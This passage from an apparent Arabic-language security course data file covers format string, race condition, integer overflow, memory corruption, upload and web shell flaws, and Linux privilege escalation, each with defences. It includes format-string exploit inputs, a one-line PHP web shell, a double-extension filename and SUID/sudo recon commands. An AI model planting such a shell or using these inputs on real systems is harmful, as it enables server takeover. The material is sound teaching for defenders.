        <h3>قراءة عناوين الذاكرة:</h3>

        <pre><code>%p %p %p</code></pre>

        <h3>استغلال %s لقراءة الذاكرة:</h3>

        <pre><code>%s</code></pre>

        <p>قد يؤدي إلى قراءة بيانات من عناوين غير مقصودة.</p>

        <h3>أخطر Specifier: %n</h3>

        <p>يستخدم لكتابة عدد الأحرف المطبوعة إلى عنوان في الذاكرة.</p>

        <h3>مثال:</h3>

        <pre><code>printf(user_input);</code></pre>

        <p>إذا استخدم المهاجم:</p>

        <pre><code>%n</code></pre>

        <p>قد يتم تعديل قيم داخل الذاكرة.</p>

        <h3>استغلال لتعديل المتغيرات:</h3>

        <p>يمكن استخدام %n لتغيير قيم مثل:</p>

        <pre><code>isAdmin = 0 → isAdmin = 1</code></pre>

        <h3>Format String Stack Leak:</h3>

        <pre><code>%08x.%08x.%08x.%08x</code></pre>

        <p>يساعد في استخراج عناوين الذاكرة.</p>

        <h3>Exploitation Chain:</h3>

        <p>1. Leak memory addresses.</p>
        <p>2. تحديد موقع return address.</p>
        <p>3. استخدام %n للكتابة في الذاكرة.</p>
        <p>4. تحويل execution flow.</p>

        <h3>مثال على استغلال مباشر:</h3>

        <pre><code>AAAA.%x.%x.%x.%x</code></pre>

        <h3>استخدام positional parameters:</h3>

        <pre><code>%7$x %8$x %9$x</code></pre>

        <h3>أماكن شائعة لوجود الثغرة:</h3>

        <p>1. Logging systems.</p>
        <p>2. Debug functions.</p>
        <p>3. Legacy C applications.</p>
        <p>4. Embedded systems.</p>

        <h3>علامات تدل على وجود الثغرة:</h3>

        <p>1. Crash عند إدخال %.</p>
        <p>2. طباعة قيم غير متوقعة.</p>
        <p>3. ظهور memory addresses.</p>

        <h3>Crash Example:</h3>

        <pre><code>%s%s%s%s%s</code></pre>

        <h3>أدوات تحليل Format String:</h3>

        <pre><code>gdb
pwndbg
gef
radare2</code></pre>

        <h3>اختبار باستخدام gdb:</h3>

        <pre><code>run %x %x %x %x</code></pre>

        <h3>فحص Stack:</h3>

        <pre><code>x/20x $esp</code></pre>

        <h3>مثال على كود آمن:</h3>

        <pre><code>// Secure Example

printf("%s", user_input);</code></pre>

        <h3>الفرق الأساسي:</h3>

        <p>بدلاً من تمرير المدخل مباشرة، يتم استخدام صيغة ثابتة.</p>

        <h3>طرق الحماية الصحيحة:</h3>

        <p><b>1. عدم تمرير input مباشرة إلى printf.</b></p>

        <p><b>2. استخدام Format ثابت مثل %s.</b></p>

        <p><b>3. تعطيل الدوال غير الآمنة.</b></p>

        <p><b>4. استخدام Compiler Warnings.</b></p>

        <p><b>5. تفعيل Stack Protections.</b></p>

        <p><b>6. مراجعة الكود منخفض المستوى.</b></p>

        <h3>Compiler Protection:</h3>

        <pre><code>-Wformat-security
-Werror=format-security</code></pre>

        <h3>خطورة الثغرة:</h3>

        <p>تعتبر Format String Vulnerability خطيرة لأنها قد تؤدي إلى تسريب الذاكرة، تعديل بيانات حساسة، أو التحكم في تنفيذ البرنامج عبر الكتابة في الذاكرة باستخدام %n، مما قد يؤدي إلى اختراق النظام بالكامل.</p>
    `
},



{
    "title": "Race Condition Exploit",
    "summary": `
        <p>تعتبر ثغرة <b>Race Condition</b> من الثغرات المنطقية (Logic Vulnerabilities) التي تحدث عندما يعتمد النظام على ترتيب تنفيذ العمليات بشكل غير آمن، بحيث يمكن تنفيذ عمليتين أو أكثر في نفس الوقت بشكل يؤدي إلى نتائج غير متوقعة.</p>

        <p>يستغل المهاجم هذه الحالة عبر إرسال طلبات متزامنة (Concurrent Requests) بهدف تغيير الحالة قبل أن ينتهي النظام من التحقق أو التحديث، مما يؤدي إلى تجاوز القيود أو تنفيذ عمليات بشكل غير صحيح.</p>

        <h3>ما هي فكرة Race Condition ؟</h3>

        <p>تحدث عندما يكون هناك:</p>

        <p>1. تحقق (Check)</p>
        <p>2. ثم تنفيذ (Act)</p>

        <p>ولكن بينهما فترة زمنية صغيرة يمكن استغلالها.</p>

        <h3>مثال مبسط:</h3>

        <pre><code>if (balance > 100) {
    balance = balance - 100;
}</code></pre>

        <p>إذا تم تنفيذ الطلب مرتين في نفس اللحظة، قد يتم خصم المبلغ مرتين رغم أن الرصيد لا يكفي.</p>

        <h3>كيف تحدث الثغرة؟</h3>

        <p>تحدث عندما لا يتم استخدام Locks أو Atomic Operations أثناء التعامل مع البيانات الحساسة.</p>

        <h3>مثال واقعي:</h3>

        <p>نظام يحتوي على كود:</p>

        <pre><code>// Vulnerable Example

if (user.balance >= 100) {
    user.balance -= 100;
    processPayment();
}</code></pre>

        <p>إذا أرسل المهاجم طلبين في نفس الوقت، يمكن أن يتم خصم الرصيد مرتين.</p>

        <h3>Exploitation Idea:</h3>

        <p>المهاجم يرسل عدة طلبات متزامنة (Parallel Requests) لاستغلال لحظة التأخير بين التحقق والتحديث.</p>

        <h3>أمثلة على الهجمات:</h3>

        <p>1. تكرار الشراء بدون خصم صحيح.</p>
        <p>2. سحب رصيد أكثر من المتاح.</p>
        <p>3. تجاوز حدود الاستخدام (Limits).</p>
        <p>4. تكرار القسائم (Coupons Abuse).</p>

        <h3>Voucher Abuse Example:</h3>

        <pre><code>POST /redeem-coupon</code></pre>

        <p>يمكن استخدام نفس الكوبون عدة مرات إذا حدث Race Condition.</p>

        <h3>Login Race Condition:</h3>

        <p>محاولة إنشاء حساب أو تسجيل دخول بنفس البيانات عدة مرات في نفس اللحظة.</p>

        <h3>Payment Race Condition:</h3>

        <p>إرسال عدة عمليات دفع متزامنة قبل تحديث الرصيد.</p>

        <h3>File Upload Race Condition:</h3>

        <p>رفع ملف ثم استبداله قبل اكتمال التحقق الأمني.</p>

        <h3>Example Scenario:</h3>

        <pre><code>1. Check balance
2. Delay
3. Deduct balance</code></pre>

        <p>المهاجم يستغل المرحلة بين (1) و (3).</p>

        <h3>Time Window Exploitation:</h3>

        <p>يسمى هذا الفاصل الزمني بـ:</p>

        <pre><code>Race Window</code></pre>

        <h3>Tools Used:</h3>

        <pre><code>Burp Suite (Turbo Intruder)
JMeter
ffuf
Custom Python Scripts
Postman (Concurrency)</code></pre>

        <h3>Burp Turbo Intruder Example Concept:</h3>

        <p>إرسال مئات الطلبات في نفس اللحظة لزيادة فرصة الاستغلال.</p>

        <h3>Indicators of Vulnerability:</h3>

        <p>1. تغير غير منطقي في الرصيد.</p>
        <p>2. تنفيذ العملية أكثر من مرة.</p>
        <p>3. تجاوز حدود الاستخدام.</p>

        <h3>Database Level Problem:</h3>

        <p>إذا لم يتم استخدام Transactions، يمكن أن تحدث Race Conditions داخل قاعدة البيانات.</p>

        <h3>Fix using Locks:</h3>

        <pre><code>lock(user) {
    if (balance >= 100) {
        balance -= 100;
    }
}</code></pre>

        <h3>Atomic Operation Example:</h3>

        <pre><code>UPDATE users
SET balance = balance - 100
WHERE balance >= 100;</code></pre>

        <h3>Database Transactions:</h3>

        <pre><code>BEGIN TRANSACTION;
UPDATE accounts SET balance = balance - 100;
COMMIT;</code></pre>

        <h3>Queue System Protection:</h3>

        <p>استخدام Queues يمنع التنفيذ المتزامن غير المنظم.</p>

        <h3>Rate Limiting vs Race Condition:</h3>

        <p>Rate limiting يقلل عدد الطلبات، لكن Race Condition تعتمد على التزامن وليس العدد فقط.</p>

        <h3>أماكن شائعة لوجود الثغرة:</h3>

        <p>1. Payment Systems.</p>
        <p>2. Coupon Systems.</p>
        <p>3. Account Balance APIs.</p>
        <p>4. File Upload Systems.</p>
        <p>5. Inventory Management.</p>

        <h3>طرق الحماية الصحيحة:</h3>

        <p><b>1. استخدام Database Transactions.</b></p>

        <p><b>2. تطبيق Locks على الموارد الحساسة.</b></p>

        <p><b>3. استخدام Atomic Operations.</b></p>

        <p><b>4. منع العمليات المتزامنة غير الضرورية.</b></p>

        <p><b>5. استخدام Queue Systems.</b></p>

        <p><b>6. تصميم API بشكل Idempotent.</b></p>

        <h3>خطورة الثغرة:</h3>

        <p>تسمح Race Condition Exploit للمهاجم باستغلال التزامن غير الآمن في النظام لتنفيذ عمليات مالية أو منطقية بشكل غير صحيح، مما قد يؤدي إلى خسائر مالية أو تجاوزات خطيرة في التطبيق.</p>
    `
},



{
    "title": "Integer Overflow Vulnerability",
    "summary": `
        <p>تعتبر ثغرة <b>Integer Overflow</b> من الثغرات الكلاسيكية في البرمجة منخفضة المستوى، وتحدث عندما تتجاوز قيمة رقمية الحد الأقصى الذي يمكن تمثيله داخل نوع البيانات (Data Type)، مما يؤدي إلى التفاف القيمة (Wrap Around) أو ظهور نتائج غير صحيحة.</p>

        <p>يمكن أن يؤدي ذلك إلى أخطاء منطقية، تجاوزات في الذاكرة، أو سلوك غير متوقع قد يستغله المهاجم في بعض السيناريوهات الحساسة.</p>

        <h3>ما هو Integer ؟</h3>

        <p>هو نوع بيانات يستخدم لتخزين الأعداد الصحيحة مثل:</p>

        <pre><code>int x = 10;</code></pre>

        <h3>ما هو الحد الأقصى؟</h3>

        <p>يعتمد على نوع البيانات:</p>

        <pre><code>8-bit  → 0 إلى 255
16-bit → 0 إلى 65535
32-bit → 0 إلى 4294967295</code></pre>

        <h3>كيف تحدث الثغرة؟</h3>

        <p>عندما نحاول تخزين قيمة أكبر من الحد الأقصى المسموح به.</p>

        <h3>مثال بسيط:</h3>

        <pre><code>unsigned char x = 255;
x = x + 1;</code></pre>

        <p>النتيجة:</p>

        <pre><code>x = 0</code></pre>

        <p>هذا يسمى <b>Wrap Around</b>.</p>

        <h3>مثال آخر:</h3>

        <pre><code>uint8_t a = 250;
a = a + 10;</code></pre>

        <p>بدلاً من 260 تصبح:</p>

        <pre><code>4</code></pre>

        <h3>لماذا تعتبر خطيرة؟</h3>

        <p>لأن النظام قد يعتمد على القيم العددية في:</p>

        <p>1. تخصيص الذاكرة.</p>
        <p>2. التحقق من الصلاحيات.</p>
        <p>3. تحديد حجم الملفات.</p>

        <h3>مثال على تخصيص ذاكرة ضعيف:</h3>

        <pre><code>// Vulnerable Example

int size = get_user_input();

char buffer[size];</code></pre>

        <p>إذا حدث Overflow قد يتحول الحجم إلى قيمة صغيرة جداً أو سالبة.</p>

        <h3>Integer Overflow في التخصيص:</h3>

        <pre><code>if (length + 100 < MAX_SIZE) {
    allocate(length + 100);
}</code></pre>

        <p>إذا حدث Overflow قد يفشل الشرط.</p>

        <h3>Integer Underflow:</h3>

        <p>هو عكس Overflow ويحدث عند النزول تحت الحد الأدنى.</p>

        <pre><code>unsigned int x = 0;
x = x - 1;</code></pre>

        <p>النتيجة تصبح قيمة كبيرة جداً.</p>

        <h3>Exploitation Idea:</h3>

        <p>يمكن للمهاجم استغلال Overflow لتجاوز التحقق من الحجم أو تخصيص ذاكرة غير صحيحة.</p>

        <h3>مثال واقعي:</h3>

        <pre><code>if (user_length < 1000) {
    buffer = malloc(user_length);
}</code></pre>

        <p>إذا حدث Overflow قد يتم تجاوز الحد.</p>

        <h3>Integer Overflow في الشبكات:</h3>

        <p>يمكن أن يؤثر على:</p>

        <p>1. حجم الحزم (Packets).</p>
        <p>2. طول البيانات.</p>
        <p>3. Parsing requests.</p>

        <h3>Integer Overflow في الأمن:</h3>

        <p>قد يؤدي إلى:</p>

        <p>1. تجاوز حدود المصفوفات.</p>
        <p>2. فساد الذاكرة.</p>
        <p>3. تنفيذ غير متوقع للبرنامج.</p>

        <h3>مثال في C:</h3>

        <pre><code>// Vulnerable Example

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main() {
    unsigned int size;

    scanf("%u", &size);

    char *buffer = malloc(size + 10);

    if (size + 10 < size) {
        printf("Overflow detected");
    }

    return 0;
}</code></pre>

        <h3>المشكلة:</h3>

        <p>التحقق يتم بعد حدوث overflow بالفعل.</p>

        <h3>أشهر الحالات:</h3>

        <p>1. Memory Allocation Bugs.</p>
        <p>2. File Size Handling.</p>
        <p>3. Loop Counters.</p>
        <p>4. Network Packet Parsing.</p>

        <h3>Example Loop Overflow:</h3>

        <pre><code>for (unsigned int i = 0; i <= max; i++)</code></pre>

        <p>قد يؤدي إلى loop غير متوقع إذا حدث overflow.</p>

        <h3>أدوات تحليل:</h3>

        <pre><code>gdb
valgrind
clang sanitizer
ASan (Address Sanitizer)</code></pre>

        <h3>Detection Example:</h3>

        <pre><code>-fsanitize=integer</code></pre>

        <h3>Example Safe Code:</h3>

        <pre><code>// Secure Example

if (size > MAX_SIZE - 10) {
    return ERROR;
}

buffer = malloc(size + 10);</code></pre>

        <h3>Using Safe Checks:</h3>

        <p>التحقق من القيم قبل إجراء العمليات الحسابية.</p>

        <h3>Best Practices:</h3>

        <p><b>1. استخدام أنواع بيانات مناسبة (int64 بدل int).</b></p>

        <p><b>2. التحقق من القيم قبل العمليات الحسابية.</b></p>

        <p><b>3. استخدام مكتبات آمنة.</b></p>

        <p><b>4. تفعيل Sanitizers أثناء التطوير.</b></p>

        <p><b>5. تجنب الاعتماد على الحسابات بدون فحص.</b></p>

        <h3>خطورة الثغرة:</h3>

        <p>تعتبر Integer Overflow Vulnerability خطيرة لأنها قد تؤدي إلى أخطاء منطقية أو فساد في الذاكرة، مما يسمح بتجاوز القيود الأمنية أو التسبب في انهيار النظام أو تنفيذ سلوك غير متوقع في التطبيقات الحساسة.</p>
    `
},




{
    "title": "Memory Corruption Basics",
    "summary": `
        <p>تُعتبر <b>Memory Corruption</b> من أخطر فئات الثغرات في أنظمة البرمجة منخفضة المستوى، وتحدث عندما يتم تعديل أو إتلاف محتوى الذاكرة بشكل غير مقصود أو خبيث، مما يؤدي إلى سلوك غير متوقع في البرنامج أو إمكانية السيطرة على التنفيذ.</p>

        <p>تشمل هذه الفئة عدة ثغرات مثل Buffer Overflow وUse-After-Free وHeap Corruption وغيرها.</p>

        <h3>ما هي الذاكرة (Memory) ؟</h3>

        <p>الذاكرة هي المكان الذي يخزن فيه البرنامج البيانات أثناء التشغيل مثل:</p>

        <p>1. المتغيرات.</p>
        <p>2. الدوال.</p>
        <p>3. الهياكل (Structures).</p>
        <p>4. التعليمات البرمجية.</p>

        <h3>أقسام الذاكرة الأساسية:</h3>

        <pre><code>Stack  → المتغيرات المحلية والدوال
Heap   → الذاكرة الديناميكية
Data   → المتغيرات العالمية
Text   → كود البرنامج</code></pre>

        <h3>ما هو Memory Corruption ؟</h3>

        <p>هو أي حالة يتم فيها:</p>

        <p>1. الكتابة خارج حدود الذاكرة.</p>
        <p>2. استخدام مؤشر غير صالح.</p>
        <p>3. تحرير ذاكرة ثم استخدامها.</p>

        <h3>أنواع Memory Corruption:</h3>

        <p>1. Buffer Overflow.</p>
        <p>2. Heap Overflow.</p>
        <p>3. Use-After-Free.</p>
        <p>4. Double Free.</p>
        <p>5. Integer Overflow.</p>
        <p>6. Format String Vulnerability.</p>

        <h3>Buffer Overflow:</h3>

        <p>يحدث عند تجاوز حجم المصفوفة.</p>

        <pre><code>char buffer[10];
strcpy(buffer, "AAAAAAAAAAAAAAAA");</code></pre>

        <h3>Heap Corruption:</h3>

        <p>يحدث عند إتلاف بيانات في Heap.</p>

        <pre><code>malloc() / free()</code></pre>

        <h3>Use-After-Free:</h3>

        <p>استخدام ذاكرة تم تحريرها مسبقاً.</p>

        <pre><code>free(ptr);
ptr->data = 10;</code></pre>

        <h3>Double Free:</h3>

        <p>تحرير نفس الذاكرة مرتين.</p>

        <pre><code>free(ptr);
free(ptr);</code></pre>

        <h3>لماذا Memory Corruption خطيرة؟</h3>

        <p>لأنها قد تؤدي إلى:</p>

        <p>1. انهيار البرنامج (Crash).</p>
        <p>2. تسريب البيانات.</p>
        <p>3. تنفيذ تعليمات خبيثة.</p>
        <p>4. السيطرة على النظام.</p>

        <h3>كيف يتم استغلالها؟</h3>

        <p>المهاجم يستغل أخطاء إدارة الذاكرة لتغيير:</p>

        <p>1. Return Address.</p>
        <p>2. Function Pointers.</p>
        <p>3. Virtual Tables (C++).</p>

        <h3>مثال على استغلال عام:</h3>

        <pre><code>[ Buffer ]
[ Control Data ]
[ Return Address ]</code></pre>

        <p>إذا تم تعديل Return Address يمكن تغيير مسار التنفيذ.</p>

        <h3>Stack vs Heap Corruption:</h3>

        <p><b>Stack:</b> أسرع لكن محدود الحجم.</p>
        <p><b>Heap:</b> أكبر لكن أكثر تعقيداً.</p>

        <h3>Heap Example:</h3>

        <pre><code>char *ptr = malloc(10);
strcpy(ptr, "AAAAAAAAAAAAAAAAAAAA");</code></pre>

        <h3>علامات وجود Memory Corruption:</h3>

        <p>1. Segmentation Fault.</p>
        <p>2. Crash غير مبرر.</p>
        <p>3. سلوك غير متوقع.</p>
        <p>4. تغيّر قيم المتغيرات فجأة.</p>

        <h3>أدوات التحليل:</h3>

        <pre><code>gdb
valgrind
ASan (Address Sanitizer)
radare2
pwndbg</code></pre>

        <h3>Memory Debugging:</h3>

        <pre><code>valgrind ./program</code></pre>

        <h3>ASan Example:</h3>

        <pre><code>-fsanitize=address</code></pre>

        <h3>Root Causes:</h3>

        <p>1. عدم التحقق من حجم الإدخال.</p>
        <p>2. استخدام دوال غير آمنة.</p>
        <p>3. سوء إدارة الذاكرة.</p>

        <h3>Unsafe Functions:</h3>

        <pre><code>gets()
strcpy()
sprintf()
strcat()</code></pre>

        <h3>Secure Coding Example:</h3>

        <pre><code>// Safe Example

fgets(buffer, sizeof(buffer), stdin);
snprintf(buffer, sizeof(buffer), "%s", input);</code></pre>

        <h3>Prevention Techniques:</h3>

        <p><b>1. استخدام Safe APIs.</b></p>

        <p><b>2. تفعيل حماية الذاكرة (ASLR, NX).</b></p>

        <p><b>3. التحقق من المدخلات.</b></p>

        <p><b>4. إدارة الذاكرة بشكل صحيح.</b></p>

        <p><b>5. استخدام أدوات تحليل الأخطاء.</b></p>

        <h3>Compiler Protections:</h3>

        <pre><code>-fstack-protector-strong
-D_FORTIFY_SOURCE=2</code></pre>

        <h3>Memory Safety Concepts:</h3>

        <p>1. Bounds Checking.</p>
        <p>2. Type Safety.</p>
        <p>3. Lifetime Management.</p>

        <h3>خطورة Memory Corruption:</h3>

        <p>تُعتبر Memory Corruption أساس العديد من الثغرات الأمنية الخطيرة لأنها قد تؤدي إلى تنفيذ كود خبيث، تسريب بيانات حساسة، أو السيطرة الكاملة على النظام إذا تم استغلالها بشكل صحيح.</p>
    `
},



{
    "title": "Reverse Shell Upload Attack",
    "summary": `
        <p>تُعتبر <b>Reverse Shell Upload Attack</b> من الهجمات الخطيرة التي تستهدف أنظمة رفع الملفات (File Upload Systems)، حيث يقوم المهاجم برفع ملف خبيث إلى السيرفر بهدف الحصول على وصول غير مصرح به إلى النظام.</p>

        <p>الفكرة الأساسية ليست في الرفع فقط، بل في أن الملف المرفوع قد يتم تنفيذه لاحقاً داخل الخادم مما يمنح المهاجم قناة تحكم عن بعد (Remote Access).</p>

        <h3>ما هي Reverse Shell ؟</h3>

        <p>هي اتصال يتم إنشاؤه من السيرفر (الضحية) إلى جهاز المهاجم، بحيث يصبح المهاجم قادراً على التحكم في السيرفر عن بعد.</p>

        <p>بعكس الاتصال الطبيعي، هنا السيرفر هو الذي يبدأ الاتصال.</p>

        <h3>كيف تحدث الثغرة؟</h3>

        <p>تحدث عندما يسمح التطبيق برفع ملفات قابلة للتنفيذ أو لا يتحقق بشكل صحيح من نوع الملف أو محتواه.</p>

        <h3>سيناريو شائع:</h3>

        <p>1. تطبيق يسمح برفع صور أو ملفات.</p>
        <p>2. لا يتم التحقق من الامتداد أو المحتوى بشكل صحيح.</p>
        <p>3. يتم رفع ملف يحتوي على كود خبيث.</p>
        <p>4. يتم الوصول للملف عبر المتصفح أو تنفيذه داخل السيرفر.</p>

        <h3>مثال على نقطة ضعف في نظام الرفع:</h3>

        <pre><code>upload.php?file=malicious</code></pre>

        <p>إذا لم يتم التحقق من الملف، يمكن أن يتم استغلاله.</p>

        <h3>طرق الاستغلال الشائعة (بشكل مفاهيمي):</h3>

        <p>1. رفع ملفات بامتدادات مزدوجة.</p>
        <p>2. إخفاء الكود داخل ملفات تبدو كصور.</p>
        <p>3. استغلال إعدادات السيرفر لتنفيذ الملفات المرفوعة.</p>
        <p>4. رفع ملفات إلى مسار يمكن تنفيذه (Web Root).</p>

        <h3>أنواع الملفات المستهدفة:</h3>

        <p>1. Web Shells.</p>
        <p>2. Scripts غير مصرح بها.</p>
        <p>3. ملفات تنفيذية.</p>
        <p>4. ملفات تحتوي على كود خبيث مخفي.</p>

        <h3>مفهوم Web Shell:</h3>

        <p>هو ملف صغير يتم رفعه إلى السيرفر يسمح للمهاجم بتنفيذ أوامر على النظام من خلال واجهة ويب.</p>

        <h3>علامات وجود الثغرة:</h3>

        <p>1. إمكانية رفع ملفات غير متوقعة.</p>
        <p>2. عدم التحقق من الامتداد الحقيقي للملف.</p>
        <p>3. إمكانية الوصول المباشر للملف المرفوع عبر URL.</p>
        <p>4. تنفيذ سلوك غير طبيعي بعد الرفع.</p>

        <h3>أخطر النتائج:</h3>

        <p>1. التحكم الكامل في السيرفر.</p>
        <p>2. سرقة البيانات الحساسة.</p>
        <p>3. تعديل أو حذف الملفات.</p>
        <p>4. تثبيت أبواب خلفية (Backdoors).</p>

        <h3>الأسباب الشائعة للثغرة:</h3>

        <p>1. عدم التحقق من امتداد الملف.</p>
        <p>2. الاعتماد على اسم الملف فقط.</p>
        <p>3. تخزين الملفات داخل مجلد قابل للتنفيذ.</p>
        <p>4. عدم استخدام فلترة MIME Type بشكل صحيح.</p>

        <h3>مثال على تصميم غير آمن:</h3>

        <pre><code>uploads/
  file_uploaded_here</code></pre>

        <p>إذا كان هذا المجلد قابل للتنفيذ عبر المتصفح، تصبح المخاطرة عالية جداً.</p>

        <h3>طرق الحماية الصحيحة:</h3>

        <p><b>1. منع تنفيذ الملفات داخل مجلدات الرفع.</b></p>

        <p><b>2. التحقق من نوع الملف الحقيقي (MIME Type Validation).</b></p>

        <p><b>3. إعادة تسمية الملفات المرفوعة عشوائياً.</b></p>

        <p><b>4. تخزين الملفات خارج Web Root.</b></p>

        <p><b>5. استخدام Allowlist للامتدادات فقط.</b></p>

        <p><b>6. فحص المحتوى وليس الاسم فقط.</b></p>

        <h3>مثال على Allowlist آمن:</h3>

        <pre><code>jpg
png
pdf
gif</code></pre>

        <h3>تحسينات أمنية إضافية:</h3>

        <p>1. تعطيل تنفيذ السكربتات داخل مجلد الرفع.</p>
        <p>2. استخدام CDN أو Storage خارجي للملفات.</p>
        <p>3. فحص الملفات باستخدام Antivirus / Scanners.</p>
        <p>4. تسجيل جميع عمليات الرفع (Logging).</p>

        <h3>آليات الكشف (Detection):</h3>

        <p>1. مراقبة الملفات الجديدة في السيرفر.</p>
        <p>2. تحليل الطلبات غير الطبيعية للرفع.</p>
        <p>3. اكتشاف الملفات ذات السلوك غير المتوقع.</p>

        <h3>خطورة الثغرة:</h3>

        <p>تُعتبر Reverse Shell Upload Attack من أخطر الهجمات على أنظمة الويب لأنها قد تؤدي إلى تنفيذ أوامر عن بعد داخل السيرفر، مما يمنح المهاجم سيطرة كاملة على النظام إذا لم يتم تأمين آلية رفع الملفات بشكل صحيح.</p>
    `
},



{
    "title": "Web Shell Upload Vulnerability",
    "summary": `
        <p>تُعتبر <b>Web Shell Upload Vulnerability</b> من أخطر ثغرات رفع الملفات، وتحدث عندما يسمح التطبيق برفع ملفات إلى الخادم دون التحقق الصحيح من المحتوى أو الامتدادات، مما قد يسمح برفع ملفات خبيثة يتم تنفيذها لاحقاً داخل السيرفر.</p>

        <p>تُستخدم هذه الثغرة غالباً للحصول على واجهة تحكم عن بعد داخل الخادم عبر ملف صغير يُعرف باسم Web Shell.</p>

        <h3>ما هو Web Shell ؟</h3>

        <p>هو ملف خبيث يتم رفعه إلى السيرفر ويحتوي على كود يسمح للمهاجم بتنفيذ أوامر نظام التشغيل عبر المتصفح.</p>

        <p>بشكل بسيط: هو لوحة تحكم مخفية على السيرفر.</p>

        <h3>كيف تحدث الثغرة؟</h3>

        <p>تحدث عندما يسمح النظام برفع ملفات بدون:</p>

        <p>1. التحقق من الامتداد الحقيقي.</p>
        <p>2. فحص محتوى الملف.</p>
        <p>3. منع تنفيذ الملفات داخل مجلد الرفع.</p>

        <h3>مثال على نظام رفع ضعيف:</h3>

        <pre><code>POST /upload
Content-Type: multipart/form-data</code></pre>

        <p>إذا تم تخزين الملف مباشرة داخل مجلد يمكن الوصول إليه عبر الويب، قد يصبح قابلاً للتنفيذ.</p>

        <h3>خطورة التنفيذ داخل السيرفر:</h3>

        <p>إذا تم تنفيذ الملف داخل Web Server (مثل Apache / Nginx مع PHP)، يمكن أن يتحول إلى واجهة تحكم كاملة.</p>

        <h3>أسباب الثغرة:</h3>

        <p>1. الاعتماد على اسم الملف فقط.</p>
        <p>2. عدم التحقق من MIME Type.</p>
        <p>3. السماح برفع ملفات سكربت.</p>
        <p>4. تخزين الملفات داخل Web Root.</p>

        <h3>أنواع الملفات المستغلة:</h3>

        <p>1. PHP Scripts.</p>
        <p>2. ASP / ASPX Files.</p>
        <p>3. JSP Files.</p>
        <p>4. CGI Scripts.</p>

        <h3>سيناريو استغلال عام:</h3>

        <p>1. رفع ملف يبدو كصورة.</p>
        <p>2. تخزينه داخل مجلد public.</p>
        <p>3. الوصول إليه عبر URL.</p>
        <p>4. تنفيذ أوامر داخل السيرفر.</p>

        <h3>مثال على مجلد خطير:</h3>

        <pre><code>/var/www/html/uploads/</code></pre>

        <p>إذا كان التنفيذ مفعلاً داخله فهذا خطر كبير.</p>

        <h3>علامات وجود الثغرة:</h3>

        <p>1. إمكانية رفع ملفات بامتدادات غير متوقعة.</p>
        <p>2. إمكانية الوصول المباشر للملف عبر الرابط.</p>
        <p>3. تنفيذ سلوك غير طبيعي بعد الرفع.</p>

        <h3>مثال على Web Shell (مفاهيمي):</h3>

        <pre><code>&lt;?php system($_GET['cmd']); ?&gt;</code></pre>

        <p>هذا المثال يوضح فكرة التنفيذ عن بعد للأوامر عبر المتصفح.</p>

        <h3>طرق التمويه (Obfuscation):</h3>

        <p>المهاجم قد يحاول إخفاء الكود داخل:</p>

        <p>1. صور مزيفة.</p>
        <p>2. امتدادات مزدوجة.</p>
        <p>3. أسماء ملفات مضللة.</p>

        <h3>مثال امتداد مزدوج:</h3>

        <pre><code>image.jpg.php</code></pre>

        <h3>خطر MIME Bypass:</h3>

        <p>بعض الأنظمة تتحقق فقط من:</p>

        <pre><code>image/jpeg</code></pre>

        <p>لكن يمكن التلاعب بهذه القيمة.</p>

        <h3>أدوات الكشف:</h3>

        <pre><code>Burp Suite
OWASP ZAP
ClamAV
File Integrity Monitoring</code></pre>

        <h3>التحقق من الملفات:</h3>

        <pre><code>file command (Linux)
magic bytes inspection</code></pre>

        <h3>مثال على حماية ضعيفة:</h3>

        <pre><code>if(file.ext == "jpg") {
    upload(file);
}</code></pre>

        <h3>المشكلة:</h3>

        <p>الاعتماد على الامتداد فقط يمكن تجاوزه بسهولة.</p>

        <h3>طرق الحماية الصحيحة:</h3>

        <p><b>1. استخدام Allowlist للامتدادات فقط.</b></p>

        <p><b>2. فحص MIME Type الحقيقي.</b></p>

        <p><b>3. تحليل Magic Bytes.</b></p>

        <p><b>4. تخزين الملفات خارج Web Root.</b></p>

        <p><b>5. تعطيل تنفيذ السكربت داخل مجلد الرفع.</b></p>

        <p><b>6. إعادة تسمية الملفات بشكل عشوائي.</b></p>

        <h3>Allowlist آمن:</h3>

        <pre><code>jpg
png
gif
pdf</code></pre>

        <h3>أفضل ممارسة للتخزين:</h3>

        <pre><code>/uploads (non-executable)</code></pre>

        <h3>Logging & Monitoring:</h3>

        <p>مراقبة كل الملفات التي يتم رفعها وتحليلها لاحقاً.</p>

        <h3>خطورة الثغرة:</h3>

        <p>تُعتبر Web Shell Upload Vulnerability من أخطر ثغرات الويب لأنها قد تسمح للمهاجم برفع ملف يمنحه تحكماً كاملاً في السيرفر، مما يؤدي إلى اختراق النظام بالكامل وسرقة البيانات أو تنفيذ أوامر عن بعد.</p>
    `
},



{
    "title": "Privilege Escalation في Linux",
    "summary": `
        <p>تُعتبر <b>Privilege Escalation</b> في نظام Linux من أهم مراحل الهجوم بعد الحصول على وصول أولي (Initial Access)، حيث يحاول المهاجم رفع صلاحياته من مستخدم عادي (user) إلى مستخدم إداري (root).</p>

        <p>إذا نجح المهاجم في ذلك، يصبح قادراً على التحكم الكامل في النظام: قراءة كل الملفات، تعديل الإعدادات، تثبيت برمجيات خبيثة، أو إنشاء مستخدمين جدد.</p>

        <h3>ما هو Privilege Escalation ؟</h3>

        <p>هو استغلال ضعف في النظام أو الإعدادات لزيادة مستوى الصلاحيات داخل الجهاز.</p>

        <h3>أنواع Privilege Escalation:</h3>

        <p>1. <b>Vertical Privilege Escalation:</b> من مستخدم عادي إلى root.</p>
        <p>2. <b>Horizontal Privilege Escalation:</b> الوصول إلى حساب مستخدم آخر بنفس الصلاحيات.</p>

        <h3>كيف يحدث في Linux؟</h3>

        <p>غالباً يحدث بسبب أخطاء في:</p>

        <p>1. إعدادات sudo.</p>
        <p>2. ملفات SUID/SGID.</p>
        <p>3. Cron Jobs.</p>
        <p>4. Kernel vulnerabilities.</p>
        <p>5. ملفات قابلة للكتابة بصلاحيات خاطئة.</p>

        <h3>1. سوء إعداد sudo (Sudo Misconfiguration)</h3>

        <p>إذا كان المستخدم يستطيع تشغيل أوامر كـ root بدون كلمة مرور:</p>

        <pre><code>sudo -l</code></pre>

        <p>قد يكشف ذلك عن صلاحيات خطيرة.</p>

        <h3>2. SUID Binaries</h3>

        <p>ملفات SUID تعمل بصلاحيات مالك الملف (غالباً root).</p>

        <pre><code>find / -perm -4000 2>/dev/null</code></pre>

        <p>إذا كان هناك برنامج غير آمن يمكن استغلاله.</p>

        <h3>مثال خطير:</h3>

        <pre><code>vim, find, bash (misconfigured)</code></pre>

        <h3>3. GTFOBins Concept:</h3>

